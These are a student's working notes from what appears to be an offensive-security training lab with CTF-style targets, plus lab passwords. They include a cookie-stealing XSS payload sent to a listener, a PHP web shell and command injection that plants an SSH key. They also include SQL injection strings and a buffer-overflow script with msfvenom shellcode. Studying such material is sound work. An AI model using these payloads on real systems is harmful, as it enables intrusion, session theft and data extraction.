First day, day one! Let's get this started, I can type with out looking at the keyboard. Oops I missed spelled without, like why is it just one word. 
Linux op station: 10.50.179.44
Getting on to
ssh demo1@10.50.15.172 -L 1111:10.208.50.61:80 for Challenges???
                                        .42   
127.0.0.1:1111/classinfo.html

BRGA-021-M   Stack# 7  PW:TEBcv54D4iPn   Jump:10.50.16.164
Challenges 10.50.178.176:8000

mol PW:WhyrightNow

favriout site for vulnerabilites: exploit-db, google the CVE # with github.



                                                                                        OP NOTES

##Control Sockets
  ssh -MS /tmp/jump student@10.50.16.164        (M is multiplexing, to connect to multiple systems, S is socket created in /tmp directory)

##ping sweep from jump box
  for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done       from jump box we can only pingsweep
                                                                                                                                                          .97, .100, .105, .111, .120
##Create Dynamic port forward
  ssh -S /tmp/jump jump -O forward -D9050
  (Later:  ssh -S /tmp/jump jump -O cancel -D9050)
  nmap
                                                                                                                                                          Nmap scan report for 192.168.28.100            
                                                                                                                                                          80/tcp   open  http GOOD
                                                                                                                                                          2222/tcp open  EtherNetIP-1 SSH
                                                                                                                                                          
                                                                                                                                                          Nmap scan report for 192.168.28.105
                                                                                                                                                          21/tcp   open  ftp GOOD
                                                                                                                                                          23/tcp   open  telnet GOOD
                                                                                                                                                          2222/tcp open  EtherNetIP-1 SSH
                                                                                                                                                          
                                                                                                                                                          Nmap scan report for 192.168.28.111
                                                                                                                                                          80/tcp   open  http GOOD
                                                                                                                                                          2222/tcp open  EtherNetI P-1 SSH
                                                                                                                                                          8080/tcp open  http-proxy HTTP
                                                                                                                                              
                                                                                                                                                          Nmap scan report for 192.168.28.120
                                                                                                                                                          4242/tcp open  vrml-multi-use SSH


##Verify ports
  proxychains nc 192.168.28.100 80

##set up port forwarding 
  ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L 1112:192.168.28.100:2222 -L 2111:192.168.28.105:2222                

## To delete one local port forward
  ssh -S /tmp/jump jump -O cancle -L 2111:192.168.28.105:2222

##Navigate to webserver on Firefox
  127.0.0.1:1111

## Authenticate to new system
  ssh -MS /tmp/t1 username@127.0.0.1 -p 1112
  man

## Find directeries to navigate to with this scan    /usr/share/nmap/scripts                            nmap --script <filename>|<category>|<directory>
                                                                                                        nmap --script-help "ftp-* and discovery"
                                                                                                        nmap --script-args <args>
                                                                                                        nmap --script-args-file <filename>
                                                                                                        nmap --script-help <filename>|<category>|<directory>
                                                                                                        nmap --script-trace
  proxychains nmap --script=http-enum 192.168.28.100

**************************************************************************************************************************************************************************************************************************
                                                                                            
                                                                                          DAY 2 Web exploitation

GET requests can be ultlized to pass data to the server with this:         http://10.50.x.x/path/pathdemo.php?myfile=demo1           Where does this go? in the site bar on top


                                                                                            OP NOTES
ssh demo1@10.50.15.172 -L 9999:10.208.50.42:80

stored XXS, open a listning port nc -lvnk 4444
on site:
<script>document.location="http://10.50.179.44:4444/?username=" + document.cookie;</script>      capture cookies
                                                                  document.body.innerHTML          capture sensitive data

using the script http-enum, we find files of interest to navigate to on the http search bar

ssh-keygen -t rsa -b 4096     to generate you own keys in an .ssh file

In order to Malicoius file upload we need
  1. ability to upload to a server
  2. know where we are uploading to
  3. be able to get there to run commands on shell created
                   <HTML><BODY>
                  <FORM METHOD="GET" NAME="myform" ACTION="">
                  <INPUT TYPE="text" NAME="cmd">
                  <INPUT TYPE="submit" VALUE="Send">
                  </FORM>
                  <pre>
                  <?php
                  if($_GET['cmd']) {
                    system($_GET['cmd']);
                    }
                  ?>
                  </pre>
                  </BODY></HTML>

To gain initial access with ssh RSA key:
  >ssh-keygen -t rsa -b 4096     to generate you own keys in an .ssh file
  >cat ~/.ssh/id_rsa.pub
  on target >ls -la /home/billybob ##check if there is an .ssh file here, if not 
            >;mkdir /home/billybob/.ssh
            >;echo "your_public_key_here" >> /home/billybob/.ssh/authorized_keys
            >;cat /home/billybob/.ssh/authorized_keys ## to make sure it there 
  >ssh billybob@127.0.0.1 -p 1112 ## this port is the one thats the ssh open on the IP


                                                              Scinerio  
Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)
Objective: Maneuver through network, identify and gain access to Minstry of Industry web servers.
Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques limited to 
cross-site scripting, command injection, file upload, and path transversal. Network scanning tools/technique usage is at the discretion of student.
Scenario Credentials: FLAG = W3B3xpl01t5t@rt0F@ct1v1ty
Prior Approvals: Development of SSH access on host: Donovian_MI_websvr. Upon identification of additional Minstry web sites, student is authorized browse to pages to collect intellegence to enable answering CTFd challenges.

Scheme of Maneuver:
>Jump Box
->T1:10.100.28.40

Target Section:

T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.

                                                                                        OP notes
>ssh -MS /tmp/jump student@10.50.16.164
>ssh -S /tmp/jump jump -O forward -D9050
>proxychains nmap -sT -T4 10.100.28.40                80/tcp   open  http    Good
                                                      4444/tcp open  krb524  SSH
>nc the ports
>ssh -S /tmp/jump jump -O forward -L 1111:10.100.28.40:80 -L 1112:10.100.28.40:4444
>proxychains nmap --script=http-enum 10.100.28.40
/robots.txt ## net_test   then a page with bars to send pings to             >>> >>> >>> >>> >>> >>> >>> Path to test ;whoami then>> cat /etc/passwd (can access linux thru here)
/css/       ## pictues of differrent sizes, and 2 files full of characters 
/images/    ## russian images
/uploads/   ##this is the cyber swareness training and the location of its ip

we found this site 10.100.28.55

****************************************************************************************************************************************************************************************************************************

                          Day 3 Web explotiation SQL
         when doing LOGINS   
POST method
        normal statement        SELECT id FROM users WHERE name=‘JohnDoe243’   AND pass=‘pass1234’    ;       Http method post cause we submit info to server
        injecting statement     SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
GET method  
        soo...F12>>hit login>>click POST >>HTML&Request tab>> raw>> 127.0.0.1:1111/*******?(the coppied URL)  

SQL DATA BASE
        ##goldenstatement   
        select table_schema,table_name,column_name from information_schema.columns
                 <NAME OF COLUMN>,<NAME OF COLUMN> from <NAME OF DATABASE>.<NAME OF TABLE>

        ##Default databases 
            information_schema
            preformance_schema
            mysql

            to use a data base                                    DATABASE we will use is called session
                          >use informaton_schema ;
                          >show tables ;
                          >show columns from columns ;
                          >select table_schema,table_name,column_name from inforamation_schema.columns
            To Query to pull data stored in the following 
                          >select tireid,name,size from session.tires ;

SQL Injection            in the URL
        POST METHOD
              1.ID vulnerable fields
              2. test out the 02' or 1='1 with the inputs and see whats different with the number of columns/selections
              3. Use 'UNION SELECT 1,2,3,4,5 #               ## missing the 2 in the table shown, also we use 5 cause the table shows 4 so we try adding 1 over and over.
              4. Modified goldenstatment Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
              5. Craft queries: Audi' UNION SELECT tireid,2,name,size,cost,color,year from session.Tires #
                                Audi' UNION SELECT tireid,name,size,cost,color,year,5 from session.Tires #
        GET METHOD                      
              change url to find vulnerable field, remove up to the char that changes everytime a different selction is made, add <UNNION SELECT 1,2,3> (cause of the 3 columns that show up normaly)
              modify golden statement: Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns
              craft query: Selection=2 UNION SELECT start,status,last_access from session.session_log            #put this into after the ?


Nesting staements     |                                                                                        |
      php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

Server-side query becomes:               |            |
      SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;

Blind injection for validation

Extract version number
      prices.php?item=4 UNION SELECT 1,2,@@version

Defending Againct 
      PHP: mysql_real_escape_string
      SQL: sqlite3_prepare()

                                                                                          OPNOTES

> proxychains nmap  --script=http-enum 10.100.28.48            /css/ /images/ /includes/ /js/ /scripts
There are 13 catagories input
Q: On the DNLA site identify the flag using the Categories page.
A: (category page url.php)? category=1 or 1=1            ##this outputs all things in the Category page

-Use the golden rule to show all tables on a section where we can select search for products, attatch to end of url.    UNION SELECT table_schema,table_name,column_name from information_schema.columns
-After getting all the cataroies and columns from the golden rule, make a query to get the info i need, make sure theres as many items as there are columns
-to search just do ' or1='1
-for version on the item=# UNION SELECT 1,2,@@version
-This is for when having to create full profile in multiple fields, the 
      INSERT INTO members (first_name, last_name, username, password, email, permission)                   ##this what the input expects
      VALUES ('Hacker', 'lastname', 'hacker4 ','password','email','1')#', 'pw', 'email', 3)                ##this is what the site sees, the # igones all to the right
-certain colums may only work in certain positons
****************************************************************************************************************************************************************************************************************************************************************************

                                                                          Day 4 Reverse Engineering
Base pointer is the start of the stack, the stack pointer is the bookmark of where we are using.

                                      X86_64 Assembly - Common Instruction Pointers
                                              MOV  move source to destination
                                              PUSH  push source onto stack
                                              POP  Pop top of stack to destination
                                              INC  Increment source by 1
                                              DEC  Decrement source by 1
                                              ADD  Add source to destination
                                              SUB  Subtract source from destination
                                              CMP  Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
                                              JMP  Jump to specified location
                                              JLE  Jump if less than or equal
                                              JE  Jump if equal


win-ops
Address
10.50.141.22

ps>strings.exe .\demo1_new.exe       to find the strings (static)
ps>type(or file) .\demo2_new.exe

run it, and give it what it wants        interact with malware, (behavioral)

opne ghidra, file>>new project>>file>> inport file (the malwares)>> clcik on files imported>>analyze>>search tab>>strings>>search>>(look for key words from when ran)>>
double click on where was found>> again>>right click on values to translate  >>open funtion of value
>>          (dynamic)

patch instrution, rightclick, patch instruction>>export with different name to test
****************************************************************************************************************************************************************************
                                                            Exploit Devepolment 

Buffer Overflow Common Terms
Heap                        Memory that can be allocated and deallocated
Stack                       A contiguous section of memory used for passing arguments
Registers                   Storage elements as close as possible to the central processing unit (CPU)
Instruction Pointer (IP)    a.k.a Program Counter (PC), contains the address of next instruction to be executed
Stack Pointer (SP)          Contains the address of the next available space on the stack
Base Pointer (BP)           The base of the stack
Function                    Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
Shellcode                   The code that is executed once an exploit successfully takes advantage of a vulnerability

Buffer Overflow Defenses
    Non executable (NX) stack
    Address Space Layout Randomization (ASLR)
    Data Execution Prevention (DEP)
    Stack Canaries
    Position Independent Executable (PIE)

                                          OPNOTES
##Static Analysis
>strings func | head
>file func

##Behavioral Analysis
>chmod u+x func
>./fun

##Dynamic analysis (fuzzing) 
>./func $(echo "123456789") ##passes arguments
>./func <<<$(echo "123456789") ## <<< is user input, if it skips program, it means its waiting for user input, 
>./func <<<$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA") ## if get a segmentation fault, we can exploit

#Disassembly
>gdb ./func                                                                                                                    linex.py
  >shell ## tkes us back to shell environment, quit gets out of gdb                                                                      #!/usr/bin/env python
  >info functions                                                                                                                        offset = "A" * 100
  >run ## or start                                                                                                                       
  >disass main ## or pdisass other fucntions "getuserinput"                                                                              print(offset)
  >pdisass getuserinput "if somthing is in red, google and read about possible vulnerabilities from said functions"
  >run <<<$(python linex.py) ## this inputs the script into what the prompt is asking for
##go to https://wiremask.eu/tools/buffer-overflow-pattern-generator/       give it a 100
## make script, copy pattern into offse instead of, enter, 
    run <<<$(python linex.py) ##copy EIP value into wiremask to find offset value
## change offset = "A" * 100 in script to the offset value
## add eip ="BBB" and print (offset+eip) to script, run it to confirm eip is "BBB"                                                      eip = "BBBB"

## Set GDB environment and find jmp esp addresses
  >shell (THIS IS DONE FOR THE MACHINE YOU ARE ON)
  >env - gdb ./func
    show env
    unset env COLUMNS
    unset env LINES
    file func
    run and ctrl+c or start
    info proc map
## grab first address after heap, last address before stack   start address 0xf7de1000     end address 0xf7ffe000
    find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4 
##copy the first 4, and convert them to little endian 
        0xf7de3b59 > \x59\x3b\xde\xf7                                      
## put into   ->                                                                                                                  eip = "\x59\x3b\xde\xf7"
shell                                                                                                                             nop = "\x90" * 15
>msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
## take all buf and put into script under nop                                                                                     buf =  b""
                                                                                                                                  buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68"
                                                                                                                                  buf += b"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52"
                                                                                                                                  buf += b"\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00"
>./func <<<$(python linex.py)                                                                                                        buf += b"\x57\x53\x89\xe1\xcd\x80"
                                                                                                                                  print (offset+eip+nop+buf)
                    OPNOTES
Vulnerable functions: printf, fgets

msfvenom -p linux/x86/exec CMD="cat /.hidden/inventory.exe" -b "\x00\xfe\x20\x0a\xff" -f python































